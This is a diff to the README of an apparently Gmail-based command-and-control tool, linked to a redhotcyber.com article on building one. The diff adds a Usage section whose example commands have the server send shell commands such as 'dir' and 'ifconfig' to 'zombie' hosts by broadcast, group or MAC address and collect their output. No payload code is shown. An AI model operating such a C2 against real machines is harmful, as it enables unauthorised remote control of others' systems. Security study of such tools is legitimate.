@@ -10,14 +10,13 @@ https://www.redhotcyber.com/post/come-realizzare-un-command-control-utilizzando-
 ## Table of Contents
 
 1. [Introduction](#introduction)
-2. [Features](#features)
-3. [Requirements](#requirements)
-4. [Installation](#installation)
-5. [Configuration](#configuration)
-6. [Usage](#usage)
-7. [Contributing](#contributing)
-8. [License](#license)
-9. [Credits](#credits)
+2. [Server Features](#serverfeatures)
+3. [Client Features](#clientfeatures)
+4. [Requirements](#requirements)
+5. [Installation](#installation)
+6. [Configuration](#configuration)
+7. [Usage](#usage)
+
 
 ## Server Features
 
@@ -44,6 +43,7 @@ https://www.redhotcyber.com/post/come-realizzare-un-command-control-utilizzando-
   Once you cloned repository you have to install requirements listed in requirements.txt
   You should use this command: pip install -r requirements.txt
 
+## Configuration
 #Create two gmail account
   In order to use the solution you need to create two gmail accounts. These two need to be personal accounts.
 
@@ -54,5 +54,30 @@ https://www.redhotcyber.com/post/come-realizzare-un-command-control-utilizzando-
 #Put password app into the code
   Copy the password app you created in the previous step and paste it in either the client or the server script.
 
-#Enjoy!
-  Now you are ready to go!
+## Usage
+options:
+  -h, --help            show this help message and exit
+  -c COMMAND, --command COMMAND
+                        Command (The command to execute or type "update" to get command output from hosts)
+  -o OS, --os OS        Operative System (linux/windows)
+  -t TYPE, --type TYPE  type of communication (unicast/multicast/broadcast)
+  -m MAC, --mac MAC     remote host mac address (Required only in case of Unicast)
+  -g GROUP, --group GROUP
+                        Group (Required only in case of Multicast)
+
+Command Example 1 -> Send "dir" command to all windows zombie
+python3 Server.py -c dir -o windows -t broadcast
+
+Commad Example 2 -> send "ifconfig" command to all linux zombie
+python3 Server.py -c ifconfig -o linux -t broadcast
+
+Commad Example 3 -> send "ifconfig" command to linux zombie into the phoenix group
+python3 Server.py -c ifconfig -o linux -t multicast -g phoenix_group
+
+Commad Example 4 -> send "ifconfig" command to a defined linux machine
+python3 Server.py -c ifconfig -o linux -t unicast -m <mac_address>
+
+Commad Example 5 -> Get Responses from zombies
+python3 Server.py -c update
+
+
